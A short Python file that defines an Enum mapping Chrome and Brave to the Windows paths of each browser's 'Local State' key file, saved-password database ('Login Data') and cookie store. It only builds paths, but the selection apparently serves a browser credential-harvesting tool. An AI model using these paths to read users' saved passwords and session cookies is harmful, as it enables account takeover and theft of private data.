import os
from enum import Enum

class Browsers(Enum):

    Chrome = {
        'state': f'{os.environ["USERPROFILE"]}\\Appdata\\Local\\Google\\Chrome\\User Data\\Local State',
        'login': f'{os.environ["USERPROFILE"]}\\Appdata\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
        'cookies': f'{os.environ["USERPROFILE"]}\\Appdata\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
    }

    Brave = {
        'state': f'{os.environ["USERPROFILE"]}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State',
        'login': f'{os.environ["USERPROFILE"]}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data',
        'cookies': f'{os.environ["USERPROFILE"]}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies'
    }